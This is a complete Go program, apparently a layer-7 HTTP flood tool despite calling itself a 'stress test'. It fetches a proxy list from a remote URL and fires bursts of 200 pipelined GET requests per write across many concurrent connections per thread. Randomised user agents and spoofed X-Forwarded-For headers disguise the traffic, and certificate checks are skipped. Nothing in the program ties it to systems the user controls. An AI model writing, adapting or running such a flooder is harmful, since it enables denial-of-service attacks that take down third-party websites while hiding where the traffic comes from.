package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// headerPoolSize is how many distinct pre-built headers we keep ready
const headerPoolSize = 256

// burstSize is how many back-to-back requests we issue per write
const burstSize = 200
const numConnsPerWorker = 20

// StressConfig holds test parameters.
type StressConfig struct {
	Target     *url.URL
	Threads    int
	Duration   time.Duration
	CustomHost string
	Port       int
	Path       string
	Proxies    []string
}

// global pre-built headers
var headerPool [][]byte
var languages = []string{
	"en-US,en;q=0.9",
	"en-GB,en;q=0.8",
	"fr-FR,fr;q=0.9",
}

func main() {
	rand.Seed(time.Now().UnixNano())

	if len(os.Args) < 4 {
		fmt.Println("Usage: l7 <URL> <THREADS> <DURATION_SEC> [CUSTOM_HOST]")
		os.Exit(1)
	}
	rawURL := os.Args[1]
	threads, _ := strconv.Atoi(os.Args[2])
	durSec, _ := strconv.Atoi(os.Args[3])
	custom := ""
	if len(os.Args) > 4 {
		custom = os.Args[4]
	}

	targetURL, err := url.Parse(rawURL)
	if err != nil {
		log.Fatalf("Invalid URL: %v", err)
	}
	port := determinePort(targetURL)
	path := targetURL.RequestURI()

	proxyList, err := loadProxies("https://8080-jdpst224-projectdown-4rfkvo3lqbs.ws-us120.gitpod.io/proxies")
	if err != nil || len(proxyList) == 0 {
		log.Fatalf("Failed to load proxies: %v", err)
	}

	cfg := &StressConfig{
		Target:     targetURL,
		Threads:    threads,
		Duration:   time.Duration(durSec) * time.Second,
		CustomHost: custom,
		Port:       port,
		Path:       path,
		Proxies:    proxyList,
	}

	initHeaderPool(cfg)

	fmt.Printf("Starting stress test: %s | threads=%d | duration=%v | proxies=%d | burst=%d\n",
		rawURL, threads, cfg.Duration, len(proxyList), burstSize)

	ctx, cancel := context.WithTimeout(context.Background(), cfg.Duration)
	defer cancel()

	runWorkers(ctx, cfg)
	fmt.Println("Stress test completed.")
}

func initHeaderPool(cfg *StressConfig) {
	headerPool = make([][]byte, headerPoolSize)
	hostHdr := cfg.Target.Hostname()
	if cfg.CustomHost != "" {
		hostHdr = cfg.CustomHost
	}
	for i := range headerPool {
		var buf bytes.Buffer
		buf.WriteString(fmt.Sprintf("GET %s HTTP/1.1\r\n", cfg.Path))
		buf.WriteString(fmt.Sprintf("Host: %s:%d\r\n", hostHdr, cfg.Port))
		buf.WriteString("User-Agent: " + randomUserAgent() + "\r\n")
		buf.WriteString("Accept-Language: " + languages[rand.Intn(len(languages))] + "\r\n")
		buf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n")
		buf.WriteString("Accept-Encoding: gzip, deflate, br, zstd\r\n")
		buf.WriteString("Connection: keep-alive\r\n")
		buf.WriteString(fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d\r\n",
			rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256)))
		buf.WriteString("\r\n")
		headerPool[i] = buf.Bytes()
	}
}

func runWorkers(ctx context.Context, cfg *StressConfig) {
    var wg sync.WaitGroup

    for wid := 0; wid < cfg.Threads; wid++ {
        wg.Add(1)
        proxyAddr := cfg.Proxies[wid % len(cfg.Proxies)]

        go func(id int, proxy string) {
            defer wg.Done()
            target := fmt.Sprintf("%s:%d", cfg.Target.Hostname(), cfg.Port)

            // spin up numConnsPerWorker parallel send-loops
            var innerWg sync.WaitGroup
            for cnum := 0; cnum < numConnsPerWorker; cnum++ {
                innerWg.Add(1)
                go func(connID int) {
                    defer innerWg.Done()
                    var conn net.Conn
                    var err error

                    for {
                        // stop if time's up
                        if ctx.Err() != nil {
                            if conn != nil {
                                conn.Close()
                            }
                            return
                        }

                        // ensure we have a live socket
                        if conn == nil {
                            conn, _, err = connect(proxy, target)
                            if err != nil {
                                time.Sleep(50 * time.Millisecond)
                                continue
                            }
                        }

                        // send one burst
                        bufs := make(net.Buffers, burstSize)
                        hdr := headerPool[rand.Intn(headerPoolSize)]
                        for i := range bufs {
                            bufs[i] = hdr
                        }
                        if _, err = bufs.WriteTo(conn); err != nil {
                            conn.Close()
                            conn = nil
                            continue
                        }

                        // no more than ~1ms backoff so other loops can run
                        time.Sleep(10 * time.Millisecond)
                    }
                }(cnum)
            }

            // wait for all conn-loops to finish (when ctx expires)
            innerWg.Wait()
        }(wid, proxyAddr)
    }

    wg.Wait()
}


func connect(proxyAddr, target string) (net.Conn, bool, error) {
	proxyURL, err := url.Parse("http://" + proxyAddr)
	if err != nil {
		return nil, false, err
	}
	dial := (&net.Dialer{Timeout: 5 * time.Second}).DialContext
	conn, err := dial(context.Background(), "tcp", proxyURL.Host)
	if err != nil {
		return nil, false, err
	}

	// if HTTPS, do HTTP CONNECT + TLS handshake
	if strings.HasSuffix(target, ":443") {
		req := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", target, target)
		if _, err := conn.Write([]byte(req)); err != nil {
			conn.Close()
			return nil, false, err
		}
		br := bufio.NewReader(conn)
		status, _ := br.ReadString('\n')
		if !strings.Contains(status, "200") {
			conn.Close()
			return nil, false, fmt.Errorf("CONNECT failed: %s", status)
		}
		for {
			line, _ := br.ReadString('\n')
			if line == "\r\n" || line == "\n" {
				break
			}
		}
		tlsConn := tls.Client(conn, &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         strings.Split(target, ":")[0],
		})
		if err := tlsConn.Handshake(); err != nil {
			tlsConn.Close()
			return nil, false, err
		}
		return tlsConn, true, nil
	}

	return conn, false, nil
}

func loadProxies(urlStr string) ([]string, error) {
	resp, err := http.Get(urlStr)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var list []string
	scanner := bufio.NewScanner(resp.Body)
	for scanner.Scan() {
		if line := strings.TrimSpace(scanner.Text()); line != "" {
			list = append(list, line)
		}
	}
	return list, scanner.Err()
}

func determinePort(u *url.URL) int {
	if p := u.Port(); p != "" {
		if pi, err := strconv.Atoi(p); err == nil {
			return pi
		}
	}
	if u.Scheme == "https" {
		return 443
	}
	return 80
}

func randomUserAgent() string {
	oses := []string{
		"Windows NT 10.0; Win64; x64",
		"Macintosh; Intel Mac OS X 10_15_7",
		"X11; Linux x86_64",
	}
	os := oses[rand.Intn(len(oses))]
	switch rand.Intn(3) {
	case 0:
		v := fmt.Sprintf("%d.0.%d.0", rand.Intn(40)+80, rand.Intn(4000))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/%s", os, v, v)
	case 1:
		v := fmt.Sprintf("%d.0", rand.Intn(40)+70)
		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s", os, v, v)
	default:
		v := fmt.Sprintf("%d.0.%d", rand.Intn(16)+600, rand.Intn(100))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s (KHTML, like Gecko) Version=13.1 Safari/%s", os, v, v)
	}
}
